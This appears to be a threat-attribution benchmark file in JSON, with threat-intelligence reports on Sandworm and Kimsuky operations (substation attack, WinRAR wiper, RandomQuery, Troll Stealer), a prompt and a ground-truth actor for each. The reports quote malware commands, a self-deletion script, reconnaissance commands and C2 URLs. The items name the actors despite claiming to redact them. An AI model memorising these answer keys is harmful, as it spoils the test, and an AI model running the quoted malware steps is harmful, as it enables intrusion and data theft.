efforts in our analysis of a series of documents detailing project requirements to enhance Russian offensive cyber capabilities.\nSimilarly, the evolution of suspected GRU-sponsored OT attacks shows a decrease in the scope of disruptive activities per attack. The 2015 and 2016 Ukraine blackout events each featured several discrete disruptive events against the OT environment (e.g., disabling UPS systems, bricking serial-to-ethernet converters, conducting a DoS attack against a SIPROTEC relay, wiping OT systems, etc.). By comparison, the INDUSTROYER.V2 incidents lacked many of those same disruptive components and the malware did not feature the wiper module from the original INDUSTROYER. Likewise, Sandworm’s activity in the OT network appears streamlined to only executing unauthorized ICS command messages, with the wiper activity limited to the IT environment. While this shift likely reflects the increased tempo of wartime cyber operations, it also reveals the GRU’s priority objectives in OT attacks.\nSandworm’s use of a native Living off the Land binary (LotLBin) to disrupt an OT environment shows a significant shift in techniques. Using tools that are more lightweight and generic than those observed in prior OT incidents, the actor likely decreased the time and resources required to conduct a cyber physical attack. LotLBin techniques also make it difficult for defenders to detect threat activity as they need to not only remain vigilant for new files introduced to their environments, but also for modifications to files already present within their installed OT applications and services. As outlined in recent research detailing the GRU's disruptive playbook, we have observed Sandworm adopting LotL tactics across its wider operations to similarly increase the speed and scale at which it can operate while minimizing the odds of detection.\nWhile we lack sufficient evidence to assess a possible link, we note that the timing of the attack overlaps with Russian kinetic operations. Sandworm potentially developed the disruptive capability as early as three weeks prior to the OT event, suggesting the attacker may have been waiting for a specific moment to deploy the capability. The eventual execution of the attack coincided with the start of a multi-day set of coordinated missile strikes on critical infrastructure across several Ukrainian cities, including the city in which the victim was located.\nOutlook\nThis attack represents an immediate threat to Ukrainian critical infrastructure environments leveraging the MicroSCADA supervisory control system. Given Sandworm's global threat activity and the worldwide deployment of MicroSCADA products, asset owners globally should take action to mitigate their tactics, techniques, and procedures against IT and OT systems. Furthermore, our analysis of the activity suggests Russia would be capable of developing similar capabilities against other SCADA systems and programming languages beyond MicroSCADA and SCIL. We urge asset owners to review and implement the following recommendations to mitigate and detect this activity.\nAcknowledgements\nThis research was made possible thanks to the hard work of many people not listed on the byline. Mandiant would like to acknowledge the Security Service of Ukraine (SBU) for their continued partnership and contributions to this report as well as their on-going collaboration. This incident response engagement was funded through the UK’s Ukraine Cyber Programme (cross-government Conflict, Stability and Security Fund) and delivered by the United Kingdom’s Foreign, Commonwealth and Development Office.\nTechnical Analysis: Sandworm Attack Against Ukrainian Substations\nInitial Compromise and Maintaining Presence\nAt this time, it is unknown how Sandworm gained initial access to the victim. Sandworm was first observed in the victim’s environment in June 2022, when the actor deployed the Neo-REGEORG webshell on an internet-facing server. This is consistent with the group’s prior activity scanning and exploiting internet facing servers for initial access. Roughly one month later, Sandworm deployed GOGETTER, which is a tunneler written in Golang that proxies communications for its command and control (C2) server using the open-source library Yamux over TLS.\nWhen leveraging GOGETTER, Sandworm utilized a Systemd service unit to maintain persistence on systems. A Systemd service unit allows for a program to be run under certain conditions, and in this case, it was used to execute the GOGETTER binary on reboot.\nThe Systemd configuration file leveraged by Sandworm enabled the group to maintain persistence on systems. The value “WantedBy” defines when the program should be run; in the configuration used by Sandworm, the setting “multi-user.target” means that the program will be run when the host has reached a state when it will accept users logging on, for example after successful power on. This enables GOGETTER to maintain persistence across reboots. The “ExecStart” value specifies the path of the program to be run, which in this case was GOGETTER.\nWhen deploying GOGETTER, Mandiant observed Sandworm leverage Systemd service units designed to masquerade as legitimate or seemingly legitimate services.\nLateral Movement to SCADA Hypervisor and OT Attack Execution\nSandworm utilized a novel technique to impact the OT environment by executing code within an End-of-Life (EOL) MicroSCADA control system and issuing commands that impacted the victim’s connected substations. Table 1 summarizes the malicious files containing the new OT capability. We note that given the attacker’s use of anti-forensics techniques, we were not able to recover all the artifacts from the intrusion.\nTo impact the OT systems, Sandworm accessed the hypervisor that hosted a SCADA management instance for the victim’s substation environment and leveraged an ISO image named \"a.iso\" as a virtual CD-ROM. The system was configured to permit inserted CD-ROMs to autorun. The ISO file, at minimum, contained the following files: \"lun.vbs\" and \"n.bat\" as both files are referenced within the D volume and therefore contained within “a.iso”. The inserted ISO led to at least the following command lines execution:\n•\twscript.exe \"d:\\pack\\lun.vbs\"\n•\tcmd /c \"D:\\pack\n.bat\"\nBased on forensic analysis, we believe “lun.vbs” contents are the following (Figure 6):\nThe contents in Figure 6 indicate that “lun.vbs” executes “n.bat”. Additional fragments recovered include text consistent with Windows command line execution (Figure 7). This fragment was identified by analyzing images from the host. Reconstruction of the host’s anti-virus logs indicates “lun.vbs” and “n.bat” were executed in close time proximity. Because of this and the reference to the attacker’s ISO folder path, we believe that the command fragment in Figure 7 is likely the contents of “n.bat”.\nThe syntax of the command fragment includes “scilc.exe”, a native utility that is part of the MicroSCADA software suite. The utility is located in the “\\sc\\prog\\exec” folder within the MicroSCADA installation directory, amongst other utilities, libraries, and resources used by MicroSCADA. The impacted MicroSCADA system was running an EOL software version that allowed default access to the SCIL-API. The “-do” flag specifies a SCIL program file to execute (Figure 8). Lastly, the command supplies a file named “s1.txt” in the \"pack\\scil\" folder of the attacker's ISO. We assess \"pack\\scil\\s1.txt\" is likely a file containing SCIL commands the attackers executed in MicroSCADA. This file was unrecoverable at the time of analysis.\nAccording to Hitachi Energy’s documentation, SCIL is a high level programming language designed for MicroSCADA control systems and can operate the system and its features (Figure 9). SCIL programs are generally text-based statements that can be composed of commands, objects, variables, calls to predefined functions, and expressions. There are several methods in which SCIL programs can execute, such as an engineer/operator clicking a button or image within the MicroSCADA system, scheduled or process derived changes, or in this case manual execution.\nWhile we were unable to identify the SCIL commands executed, we believe they were probably commands to open circuit breakers in the victim’s substation environments. The SCIL commands would have caused the MicroSCADA server to relay the commands to the substation RTUs via either the IEC-60870-5-104 protocol for TCP/IP connections or the IEC-60870-5-101 protocol for serial connections.\nSandworm Deployed New CADDYWIPER Variant to Further Disrupt the Victim’s IT Environment\nTwo days following the OT activity, Sandworm deployed a new variant of CADDYWIPER throughout the IT environment. This CADDYWIPER variant, compiled in October 2022, contains some minor functionality improvements that allow threat actors to resolve functions at runtime. We have observed CADDYWIPER deployed across several verticals in Ukraine, including the government and financial sectors, throughout Russia’s invasion of Ukraine.\nCADDYWIPER is a disruptive wiper written in C that is focused on making data irrecoverable and causing maximum damage within an environment. CADDYWIPER will attempt to wipe all files before proceeding to wipe any mapped drives. It will then attempt to wipe the physical drive partition itself. Notably, CADDYWIPER has been the most frequently used disruptive tool against Ukrainian entities during the war and has seen consistent operational use since March 2022, based on public reporting. We have observed Sandworm utilize CADDYWIPER in disruptive operations across multiple intrusions.\nSandworm deployed CADDYWIPER in this operation via two Group Policy Objects (GPO) from a Domain Controller using TANKTRAP. TANKTRAP is a utility written in PowerShell that utilizes Windows group policy to spread and launch a wiper. We have observed TANKTRAP being used with other disruptive tools including NEARMISS, SDELETE, PARTYTICKET, and CADDYWIPER. These group policies contained instructions to copy a file from a server to the local hard drive and to schedule a task to run the copied file at a particular time.\nBoth TANKTRAP GPOs deployed CADDYWIPER from a staged directory to systems as msserver.exe. CADDYWIPER was then executed as a scheduled task at a predetermined time.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Sandworm"
    },
    {
        "url": "https://socradar.io/sandworm-attackers-use-winrar-to-wipe-data-from-government-devices/",
        "Text": "Sandworm Attackers Use WinRAR to Wipe Data from Government Devices\nSandworm (UAC-0165), a Russian hacking group, has been linked to an attack on Ukrainian state networks that involved wiping data from government devices using WinRAR, according to an advisory from the Ukrainian Government Computer Emergency Response Team (CERT-UA). \nThe attackers accessed critical systems by exploiting VPN accounts lacking multi-factor authentication (MFA). Then, they deleted files from Windows and Linux devices using scripts with the WinRAR archiving program.\nHow Did the Sandworm Attackers Wipe the Data?\nSandworm attackers used a BAT script while targeting Windows operating systems. The script, called “RoarBAT,” can search disks and specific directories for numerous file types and archive them using WinRAR. The RoarBAT can search for the following file types: .doc, .docx, .rtf, .txt, .xls, .xlsx, .ppt, .pptx, .vsd, .vsdx, .pdf, .png, .jpeg, .jpg, .zip, .rar, .7z, .mp4, .sql, .php, .vbk, .vib, .vrb, .p7s, .sys, .dll, .exe, .bin, and .dat.\n \nRoarBat scans all drives for designated file types (Source: CERT-UA)\nThe Sandworm attackers utilized the “-df” command-line option while running WinRAR, which led to deleting files as they were archived. Data on the devices were wiped following the deletion of the archives by using the del command combined with the name of the archive file.\nAccording to CERT-UA, the RoarBAT script was distributed to devices on the Windows domain using Group Policy through a scheduled task.\n \nA scheduled task is established to execute the BAT script (Source: CERT-UA)\nThe threat actors used a Bash script on Linux systems, which employed the “dd” utility to overwrite target files with zero bytes, making file recovery unlikely or impossible.\nThe attackers likely used legitimate programs such as ‘dd’ and WinRAR to avoid detection by security software. \nCERT-UA has stated that this incident is similar to a previous destructive attack that targeted the Ukrainian state news agency called “Ukrinform” in January 2023. This attack was also attributed to Sandworm. \nThe organization notes that the method used to carry out the attack, the IP addresses of the attackers, and the fact that a modified version of RoarBat was used all provide evidence of the similarity between the two incidents. \n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Sandworm"
    },
    {
        "url": "https://www.sentinelone.com/labs/kimsuky-ongoing-campaign-using-tailored-reconnaissance-toolkit/",
        "Text": "Kimsuky | Ongoing Campaign Using Tailored Reconnaissance Toolkit\nExecutive Summary\n•\tSentinelLabs has observed an ongoing campaign by Kimsuky, a North Korean APT group, targeting North Korea-focused information services, human rights activists, and DPRK-defector support organizations.\n•\tThe campaign focuses on file reconnaissance and information exfiltration using a variant of the RandomQuery malware, enabling subsequent precision attacks.\n•\tKimsuky distributes RandomQuery using Microsoft Compiled HTML Help (CHM) files, their long-running tactic for delivering diverse sets of malware.\n•\tKimsuky strategically employs new TLDs and domain names for malicious infrastructure, mimicking standard .com TLDs to deceive unsuspecting targets and network defenders.\nOverview\nSentinelLabs has been tracking a targeted campaign against information services, as well as organizations supporting human rights activists and defectors in relation to North Korea. The campaign focuses on file reconnaissance, and exfiltrating system and hardware information, laying the groundwork for subsequent precision attacks. Based on the infrastructure used, malware delivery methods, and malware implementation, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor.\nKimsuky is a suspected North Korean advanced persistent threat (APT) group known for targeting organizations and individuals on a global scale. Active since at least 2012, the group regularly engages in targeted phishing and social engineering campaigns to collect intelligence and gain unauthorized access to sensitive information, aligning with the interests of the North Korean government.\nLately, Kimsuky has been consistently distributing custom malware as part of reconnaissance campaigns to enable subsequent attacks. For example, we recently revealed the group’s distribution of ReconShark through macro-enabled Office documents.\nThe campaign we discuss in this post indicates a shift towards using a variant of the RandomQuery malware that has the single objective of file enumeration and information exfiltration. This stands in contrast to recently observed RandomQuery variants supporting a wider array of features, such as keylogging and execution of further specialized malware.\nRandomQuery is a constant staple in Kimsuky’s arsenal and comes in various flavors. This campaign specifically uses a VBScript-only implementation. The malware’s ability to exfiltrate valuable information, such as hardware, operating system, and file details, indicates its pivotal role in Kimsuky’s reconnaissance operations for enabling tailored attacks.\nThis campaign also demonstrates the group’s consistent approach of delivering malware through CHM files, such as keylogging and clipboard content theft malware. In line with their modus operandi, Kimsuky distributes the RandomQuery variant we observed through this vector.\nFinally, this campaign highlights Kimsuky’s recent extensive use of less common top-level domains (TLDs) for their infrastructure, such as .space, .asia, .click, and .online. The group also uses domain names that mimic standard .com TLDs, aiming to appear legitimate.\nInitial Targeting\nKimsuky makes use of specially crafted phishing emails to deploy RandomQuery. The phishing emails are sent to targets from an account registered at the South Korean email provider Daum, a standard Kimsuky phishing practice. Recent sender email addresses include bandi00413[@]daum.net.\nThe phishing emails, written in Korean, request the recipient to review an attached document claiming to be authored by Lee Kwang-baek, the CEO of Daily NK. Daily NK is a prominent South Korean online news outlet that provides independent reporting on North Korea, making them a prime organization for impersonation by DPRK threat actors looking to appear legitimate.\nKimsuky phishing email (in Korean)\nThe attached document is a CHM file stored in a password-protected archive. Aligning with the targeting focus of Kimsuky in this campaign, the lure document is entitled “Difficulties in activities of North Korean human rights organizations and measures to vitalize them” and presents a catalog of challenges pertaining to human rights organizations.\nLure document snippet (in Korean)\nConsistent with known Kimsuky tactics, the CHM file contains a malicious Shortcut object that activates on the Click event. The object:\n•\tCreates a Base-64 encoded file in the %USERPROFILE%\\Links\\ directory, such as mini.dat.\n•\tDecodes the file using the certutil utility, creating a VB script, and then stores the script in a separate file, such as %USERPROFILE%\\Links\\mini.vbs.\n•\tEstablishes persistence by editing the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry key, such that the newly created VB script is executed at system startup.\nShortcut object\nThe VB script issues a HTTP GET request to a C2 server URL, for example, http[://]file.com-port.space/indeed/show[.]php?query=50, and executes the second-stage payload returned from the server. Based on overlaps in code documented in previous work, we assess that the second-stage payload is a VBScript RandomQuery variant.\nExecution of a RandomQuery variant\nDissecting RandomQuery\nThe RandomQuery variant that Kimsuky distributes first configures the Internet Explorer browser by editing registry values under HKCU\\Software\\Microsoft\\Internet Explorer\\Main:\n•\tSets Check_Associations to no: The system does not issue a notification if Internet Explorer is not the default web browser.\n•\tSets DisableFirstRunCustomize to 1: Prevents Internet Explorer from running the First Run wizard the first time a user starts the browser.\nRandomQuery also sets the registry value HKCU\\Software\\Microsoft\\Edge\\IEToEdge\\RedirectionMode to 0, which stops Internet Explorer from redirecting to the Microsoft Edge browser.\nRandomQuery configures Internet Explorer\nThese Internet Explorer configurations enable the uninterrupted use of the browser by RandomQuery, whose earlier variants are known to use the InternetExplorer.Application object when communicating with C2 servers. However, the RandomQuery variant we analyzed does not use this object, but leverages Microsoft.XMLHTTP for this purpose.\nRandomQuery then proceeds to gather and exfiltrate information about the infected platform, structured into three classes that the malware refers to as Basic System, Specific Folder, and Process List.\nThe malware first gathers system and hardware information using the Win32_ComputerSystem, Win32_OperatingSystem, and Win32_Processor WMI classes, such as: computer name, processor speed, OS version, and the amount of physical memory available to the system. RandomQuery refers to this information as Basic System information.\nRandomQuery gathers Basic System information\nRandomQuery then enumerates subdirectories and files within particular directories by specifying them using ID numbers of the Windows ShellSpecialFolderConstants enumeration: Desktop (ID 0); Documents (ID 5, for example, C:\\Users\\[username]\\Documents); Favorites (ID 6, for example, C:\\Documents and Settings\\[username]\\Favorites); Recent (ID 8, for example, C:\\Users\\[username]\\AppData\\Roaming\\Microsoft\\Windows\\Recent); Program Files (ID 38, for example, C:\\Program Files); Program Files (x86) (ID 42, for example, C:\\Program Files (x86) on 64-bit platforms); and %USERPROFILE%\\Downloads (ID 40, for example, C:\\Users\\[username]\\Downloads).\nThe malware refers to this information as Specific Folder information: It provides the attackers with a wealth of user- and platform-related information, such as installed applications, user document details, and frequented websites.\nRandomQuery gathers Specific Folder information\nRandomQuery also enumerates the process and session IDs of running processes using the Win32_Process WMI class. The malware refers to this information as Process List information.\nRandomQuery gathers Process List information\nTo exfiltrate the gathered information, RandomQuery first Base64-encodes it, and then constructs and issues an HTTP POST request containing the information to a C2 server URL (for example, http[://]file.com-port.space/indeed/show[.]php?query=97). We observed that the C2 URLs RandomQuery uses for exfiltration overlap with the URLs from which RandomQuery itself is downloaded, with a difference in the value of the query parameter.\nRandomQuery exfiltrates information\nThe variants we analyzed use c2xkanZvaXU4OTA as a boundary string separating header values from the exfiltrated information stored in the POST request. Pivoting on this string enabled us to identify additional RandomQuery variants used by Kimsuky in the past. This is a further indication of the threat group consistently using this malware in its targeted campaigns.\nThese variants differ to various extents from those we observed in Kimsuky’s latest campaign. This includes features such as enumeration of deployed security products, focus on Microsoft Word documents when enumerating files, and execution of additional malicious code. Kimsuky continuously adapts its RandomQuery arsenal to the task at hand, with the current iteration focussing on information exfiltration and file reconnaissance.\nInfrastructure\nKimsuky has made extensive use of less common TLDs during their malicious domain registration process. In our recent reporting on Kimsuky’s ReconShark activity, we noted multiple clusters of malicious domains which made use of the same technique.\nThis latest campaign is tied to infrastructure abusing the .space, .asia, .click, and .online TLD’s, combined with domain names mimicking standard .com TLDs. Noteworthy examples include com-def[.]asia, com-www[.]click, and com-otp[.]click. Placed into a full URL path, an average user is less likely to spot obvious suspicious links.\nCampaign-related domain registration timeline\nFor this latest campaign, the threat actor used the Japan-based domain registration service Onamae for primary malicious domain purchasing. This particular cluster of activity began on May 5th 2023, and continues as of this report. ABLENET VPS Hosting is used by the actor following domain registration.\nConclusion\nWe continue to closely monitor the persistent attacks carried out by Kimsuky and its continuously advancing attack toolkit. These incidents underscore the ever-changing landscape of North Korean threat groups, whose remit not only encompasses political espionage but also sabotage and financial threats.\nIt is imperative for organizations to familiarize themselves with the TTPs employed by suspected North Korean state-sponsored APTs and to adopt appropriate measures to safeguard against such attacks. The correlation between recent malicious activities and a broader range of previously undisclosed operations attributed to North Korea emphasizes the importance of maintaining a state of constant alertness and fostering collaborative efforts.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Kimsuky"
    },
    {
        "url": "https://medium.com/s2wblog/kimsuky-disguised-as-a-korean-company-signed-with-a-valid-certificate-to-distribute-troll-stealer-cfa5d54314e2",
        "Text": "Kimsuky disguised as a Korean company signed with a valid certificate to distribute Troll Stealer (English ver.)\nExecutive Summary\n•\tS2W threat research and intelligence center Talon has hunted for and analyzed a sample of what is believed to be a new malware from the Kimsuky group on VirusTotal.\n— The malware was found to be distributed from a page that redirects users to a specific site located in South Korea to download a security program.\n— Unlike typical supply chain attacks, only 2 of the 5 installers distributed by the site were modified to include the malware.\n•\tThe hunted malware is an Info-stealer malware written in Go language that steals information from the infected system, which is dropped and executed from a Dropper disguised as a security program installation file (TrustPKI, NX_PRNMAN) from SGA Solutions.\n•\tThe dropper runs as a legitimate installer alongside the malware, and both the dropper and malware are signed with a valid, legitimate “D2innovation Co.,LTD” certificate, suggesting that the company’s certificate was actually stolen.\n•\tS2W Talon has named the malware “Troll Stealer” because it contains the pathname “D:/~/repo/golang/src/root.go/s/troll/agent” within the malware.\n•\t(Behaviors) Troll Stealer can steal information from the infected system like SSH, FileZilla, C drive files/directories, browser, system information, screen captures and send it to the C&C server.\n•\t(Attribution) Based on the Kimsuky group’s recent active use of Go-based malware, and the fact that Troll Stealer contains a lot of code similar to the AppleSeed and AlphaSeed malware associated with the Kimsuky group, we speculate that the Kimsuky group is behind the distribution of this malware.\n— However, there is also a possibility that another group closely associated with the Kimsuky group is behind the malware, as we have identified some differences in the TTPs from those previously observed from the Kimsuky group.\n•\t(Target) Troll Stealer includes the ability to steal the GPKI folder on infected systems, which suggests that the campaign may have been targeting devices within administrative and public organizations in South Korea.\n— However, there are some differences in the TTP from the Kimsuky group’s previous TTPs, suggesting that another group closely associated with the Kimsuky group may be behind this campaign.\n•\tIn addition to Troll Stealer, additional malware signed with the same legitimate certificate was found, so malware signed with that certificate may be distributed in the future.\nIntroduction\nOn January 10, 2024, a Go language-based information-stealing malware was discovered and we conducted a detailed analysis. The malware was distributed from a security program download page that was redirected when accessing a specific website in Korea and disguised as a security program installation file (TrustPKI, NX_PRNMAN) of SGA Solutions.\nThe malware was identified as a dropper type that drops and executes both a legitimate installer and malware when executed, and both the dropper and internal malware were signed with a valid “D2innovation Co.,LTD” certificate instead of the original certificate “SGA Solutions”.\nThe DLL file dropped from the dropper file is a Go language-based information-stealing malware packed with VMProtect and contains the path “D:/~/repo/golang/src/root.go/s/troll/agent” inside. It collects certain files and system information on the infected system and leaks the collected information to the C&C server. Our analysis revealed that it borrows some code from open-source stealers.\nTalon, S2W’s threat research and intelligence center, believes that the Kimsuky group is behind the malware because it has similarities to existing malware from the Kimsuky group, such as nearly identical commands for collecting system information in the AppleSeed malware and the same RC4 + RSA combination for file encryption used by the AlphaSeed malware.\nTalon has named the malware “Troll Stealer” because it uses the pathname “D:/~/repo/golang/src/root.go/s/troll/agent”.\nDetailed Analysis\nSample Information\n•\tMD5: 7b6d02a459fdaa4caa1a5bf741c4bd42\n•\tSHA256: f8ab78e1db3a3cc3793f7680a90dc1d8ce087226ef59950b7acd6bb1beffd6e3\nThe malware is disguised as the TrustPKI installer for the SGA solution, and when executed, it steals information from the infected system and sends it to the C&C server.\n1.\tDropper drops a malicious DLL file and loads the file via Rundll32.exe\n2.\tIt executes the NXTPKIENTS.exe file, which is a legitimate installer\n3.\tTroll Stealer steals information from the infected system through malicious behavior\n4.\tThen, it sends stolen data to the C&C server\n5.\tAlso, it performs self-deletion via Powershell\nStage1. Dropper\n1. Mutex & Self-deletion\nWhen executed, it creates a mutex to prevent duplicate execution and subsequently creates and executes a BAT script file in the %Temp% subpath for self-deletion.\nMutex name: windows update {2024–1020–02A}\n•\tFile path: %Temp%\\[A-Z0–9]{4}.tmp.bat\n•\tBAT file contents\n:goto_redel\nrd /s /q [File path]\ndel [File path]\nif exist [File path] goto goto_redel\ndel %Temp%\\[A-Z0-9]{4}.tmp.bat\n2. Execute Normal Installer (NXTPKIENTS.exe)\nThen drop and run a legitimate installation file from SGA Solutions in the Desktop path. The installation file is verified to be a legitimate file signed with the “SGA Solutions Co.,Ltd”. certificate.\n•\tFile path: %USERPROFILE%\\Desktop\\NXTPKIENTS.exe\n3. Drop & Load Malicious DLL\nIn addition to the normal installation files, it also drops Troll Stealer and a file for checking for infection, and the paths to each of these files are shown below. The folder and file names generated by different Dropper malware samples vary, but the following paths and names were found in the samples we analyzed.\nTroll Stealer is then executed via the rundll32.exe process, which calls the same Export function as the filename used for the infection check. The malware was packed with VMProtect to prevent analysis.\n•\tCommand: C:\\Windows\\system32\\rundll32.exe %AppData%\\[DLL Path] [Export]\nStage2. Troll Stealer\n•\tFilename: C:\\Users\\admin\\AppData\\Roaming\\Hancom\\hc-[a-z0–9]{8}.png\n•\tMD5: 88f183304b99c897aacfa321d58e1840\n•\tSHA256: 61b8fbea8c0dfa337eb7ff978124ddf496d0c5f29bcb5672f3bd3d6bf832ac92\n•\tType: DLL\n1. Initial behavior\nDuring its initial execution, it deletes the “ChromeUpdateTaskMachineUAC” scheduler. However, given that Troll Stealer and its parent Dropper do not have the feature to register a scheduler with the above name, it is likely that it did not accidentally remove a feature that was used in the past.\n•\tCommand: schtasks /delete /f /tn “ChromeUpdateTaskMachineUAC”\nThe malware then checks for the existence of the file to check the infection dropped by the dropper malware to determine if it was executed via a dropper. It performs malicious behavior only if the file exists.\n•\tFile path: %ProgramData%\\limsjo.a\nStealer itself registers mutexes to prevent malware duplicate execution.\n•\tMutex name: chrome development kit 1.0\n2. Set configuration data\nIt collects the MAC address and directory path of the infected system and creates a temporary file with configured data for later malicious behavior. Configuration contains information such as C&C server addresses.\n•\tConfiguration path: %UserProfile%\\.tmp\\{Random Number}.org\n•\tC&C server: hxxp[:]//qi.limsjo.p-e[.]kr/index.php\n•\tC&C server: hxxp[:]//ai.limsjo.p-e[.]kr/index.php\n•\tExamples of configuration data\n{\n \"ServerID\": 0,\n \"ObjectID\": 0,\n \"GtType\": 2111,\n \"GtID\": [sha1_hash(little_endian(mac_addr[:8]))],\n \"GtVer\": \"gt@2.0\",\n \"Interval\": 0,\n \"LocalPath\": \"%AppData%\\local\\\",\n \"MacAddr\": [MacAddr],\n \"ProxyNum\": 5,\n \"ProxyUrl\": [\n  \"\",\n  \"\",\n  \"\",\n  \"http://qi.limsjo.p-e.kr/index.php\",\n  \"http://ai.limsjo.p-e.kr/index.php\"\n ]\n}\nThe Config file is then encrypted, sent to the C&C server, and deleted.\n•\tEncrypted config file path: %AppData%\\local\\gcfg@{YYMMDD}(HH.MM.SS-000).gte1\n3. Data collection\nTroll Stealer steals various information from the infected system, encrypts it, and sends it to the C&C server. The malware steals the following information\n3.1. SSH\nIt exfiltrates the infected system’s SSH information. It compresses the system’s .ssh directory and creates a file. Afterward, it encrypts the compressed file, creates a file in a different path, and sends it to the C&C server.\n•\t.SSH directory save path: %USERPROFILE%\\.ssh\n•\tEncrypted file path: %AppData%\\local\\tsd@{YYMMDD}(HH.MM.SS-000).gte1\n3.2. FileZilla\nIt exfiltrates information from FileZilla software present on the infected system. It compresses the filezilla directory and creates a file. The compressed file is then encrypted and created as a file in a different path and sent to the C&C server.\n•\tFileZilla directory save Path: %AppData%\\filezilla\n•\tEncrypted file path: %AppData%\\local\\tfd@{YYMMDD}(HH.MM.SS-000).gte1\n3.3. Microsoft Sticky Note\nIt exfiltrates information from Microsoft Sticky Note present on the infected system. It compresses the localstate directory and creates a file. The compressed file is then encrypted and created as a file in a different path and sent to the C&C server.\n•\tMicrosoft Sticky Note save path: %USERPROFILE%\\AppData\\Local\\packages\\microsoft.microsoftstickynotes_8wekyb3d8bbwe\\localstate\n•\tEncrypted file path: %AppData%\\local\\tnd@{YYMMDD}(HH.MM.SS-000).gte1\n3.4. “GPKI” directory in C Drive\nTroll Stealer steals data from a specific folder on the C drive of an infected system. The attacker collects the names of files and folders on the C drive and appends additional strings to create a new string, as shown below. It then generates a SHA512 hash of that string, and if it is the same as the hardcoded SHA512 hash in the malware, it encrypts the file and sends it to the C&C server. Analyzing the hardcoded SHA512 hash revealed that the attacker attempted to steal the GPKI folder on the C drive.\n•\tString format: “aaxxyyzz” + {File name} + “zzyyxxaa”\n==> Target string: aaxxyyzzgpkizzyyxxaa\n•\tHardcoded SHA512 hash in Troll Stealer: 17ccb0832c3382b5f9e86236e035d899a351c98f3871080c138d4494218cbbc2b6f9dc43705ed97e8b0b09f25752302094e0d297151f67b22328af95610f72f1\n•\tEncrypted file path: %AppData%\\local\\tcd@{YYMMDD}(HH.MM.SS-000).gte1\nGPKI, also known as an administrative electronic signature certificate, is an authorized certificate used to verify the authenticity of administrative electronic signatures, which is used by governments such as administrative and public institutions in South Korea. In other words, it is not used on ordinary computers but is usually installed on computers used for public affairs. In this regard, it is believed that this campaign is aimed at targeting PCs installed in public.\n3.5. Browser Information\nIt steals browser information from the infected system. The malware is believed to have utilized HackBrowserData, an open-source program written in Go language, to steal browser information. It targets Chromium-based browsers and Firefox browsers on infected systems and steals various information such as cookies, history, downloads, and extensions and saves them as JSON files in the browser directory. After compressing the browser directory, it performs encryption and sends it to the C&C server.\n•\tBrowser save path: %AppData%\\local\\browser\n•\tEncrypted file path: %AppData%\\local\\tbd@{YYMMDD}(HH.MM.SS-000).gte1\n3.6. System Information\nIt steals system information from an infected system. It collects infected system information through CMD commands, encrypts it, and creates a file. The encrypted file is sent to the C&C server.\n•\tEncrypted file path: %AppData%\\local\\ccmd@{YYMMDD}(HH.MM.SS-000).gte1\n•\tCommands to collect system information\nsysteminfo & \nnet user & \nquery user & \npowershell Get-CimInstance -Namespace root/SecurityCenter2 -Classname AntivirusProduct & \nwmic qfe & \nwmic startup get & \nwmic logicaldisk get & \nipconfig /all & \narp -a & \nroute print & \ntasklist & \nwmic process get Caption, Commandline & \ndir \"%programfiles%\" & \ndir \"%programfiles% (x86)\" & \ndir \"%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\" & \ndir \"%appdata%\\Microsoft\\Windows\\Recent\" & \ndir /s \"%userprofile%\\desktop\" & \ndir /s \"%userprofile%\\downloads\" & \ndir /s \"%userprofile%\\documents\"\n3.7. Screen Capture\nCapture the current desktop screen of the infected machine and save it to a file. Use the screenshot package of “kbinani” published on Github to capture the desktop screen. Encrypt the captured file and create a file, then send the encrypted file to the C&C server.\n•\tEncrypted file path: %AppData%\\local\\ssht@{YYMMDD}(HH.MM.SS-000).gte1\n4. File Encryption\nBefore sending the stolen data to the C&C server, it encrypts the data using a combination of RC4 and RSA-4096 algorithms. The malware parses the RSA public key from the hardcoded DER of PKCS#1. It then randomly generates an RC4 key value and uses it to encrypt the stolen data. The RC4 encryption key is encrypted with the RSA public key.\n•\tHardcoded PKCS#1 DER\n3082020a0282020100c3fc0e50f4dcafec48ee42362d70c8f6b3153e91566b15a9540d0ca9f3e81846093d8752940b414043c0eaa752dd29b3aa7132bc3a1c9d8c8ed8aeaeb51c1ab99491879e8e9af96eec3f87d64fdc6dc2e51bed259314c6417d481472463a3df1ca5a16254f203aecb10c56e0dc0b8f9f6e70cc286161dbd2d0e6e3652a438ba1e48cc822cb2138f012e4cd4132c627ca165a17793785fc4c74198b03bcd8743f389345edb4238984ebf84d9a89851b5adc6378a4c0b441bab7f7e15330be4ed3abadb393cce9a3f1e37cf71cbbf3cc32c2b399cdc2cd65f651be21ef84c9bf67c13cbd38a0d0897dfc1f6b7ba809ef59f5de9019697115ddfdae5cb885f78e4766af4c23c95ebb198656ee391d788ab52fd760670561d417f099538f45f652b438b5b32afa0c2ae08eb04381112a254aff4e6eeb1db29be8dc248a85226a21528e87b837801f7a81ab4e0b03d0b23ba8c69bad52d094c343444676b9d1516cf3cf1017942cf12eadc16cf56f843ba344deb6c7e935b4abf574d8121b301dc05ce7945578ede2f14be9daab4bd6be430dcf7f4e39e97fba7f462822c6743ac8dc79674dcd5c958c94bf27490758e9fa13432e5f0134cacd422115a0e76fcfd14b9b86f88bb3e136fc54c46ea6d2212ea00478dc11d9cf80c06fab2c4a3c7d3ad5f4fa00f4999a2170189eb747368e41c2cf41302e476c39861876512d9f8d355b0203010001\n5. C&C Communication\nThe malware creates a 60-byte structure and organizes 12 fields to exfiltrate the Config data and data 